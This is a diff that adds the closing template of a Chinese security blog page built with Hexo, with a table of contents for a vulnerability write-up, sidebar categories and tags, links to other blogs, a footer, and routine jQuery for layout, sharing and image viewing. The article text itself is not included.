+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理分析"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞修复"><span class="toc-number">3.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">4.</span> <span class="toc-text">参考资料</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/JAVA/" title="JAVA">JAVA<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Linux/" title="Linux">Linux<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Python/Machine-Learning/" title="Machine Learning">Machine Learning<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/ORACLE/" title="ORACLE">ORACLE<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Python/" title="Python">Python<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Spring/" title="Spring">Spring<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Struts2/" title="Struts2">Struts2<sup>1</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/JAVA/" title="JAVA">JAVA<sup>10</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Deserialize/" title="Deserialize">Deserialize<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Python/" title="Python">Python<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Spring/" title="Spring">Spring<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/RCE/" title="RCE">RCE<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Machine-Learning/" title="Machine Learning">Machine Learning<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Scikit-Learn/" title="Scikit-Learn">Scikit-Learn<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Pybrain/" title="Pybrain">Pybrain<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Cdlinux/" title="Cdlinux">Cdlinux<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Linux/" title="Linux">Linux<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Struts2/" title="Struts2">Struts2<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ORACLE/" title="ORACLE">ORACLE<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://p2j.cn" target="_blank" title="园长博客">园长博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.shack2.org" target="_blank" title="Shack2博客">Shack2博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.cnseay.com" target="_blank" title="Seay博客">Seay博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.z7ys.com" target="_blank" title="z7y博客">z7y博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://bluereader.org" target="_blank" title="深蓝阅读">深蓝阅读</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.untnt.com" target="_blank" title="TNT博客">TNT博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.03sec.com/" target="_blank" title="Sky博客">Sky博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.jxcm.net/" target="_blank" title="DCC博客">DCC博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://cnbraid.com" target="_blank" title="Braid&#39;s Blog">Braid&#39;s Blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.xiyv.net" target="_blank" title="wolf&#39;s blog">wolf&#39;s blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.blackh4t.org" target="_blank" title="DarkRay&#39;s BLoG">DarkRay&#39;s BLoG</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.00theway.org" target="_blank" title="00theway&#39;s Blog">00theway&#39;s Blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://bksec.net/" target="_blank" title="my5t3ry&#39;s Blog">my5t3ry&#39;s Blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.00day.com/" target="_blank" title="Luoye&#39;s blog">Luoye&#39;s blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.imbeee.com" target="_blank" title="Beeeの零碎事">Beeeの零碎事</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> 当才华还撑不起野心时，那就应该静下心来学习。 <br/>
+			当能力还驾奴不了目标时，就应该沉下心来历练。</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2021 
+		Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
+		
+		<a href="/about" target="_blank" title="iswin">iswin</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#nothing"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
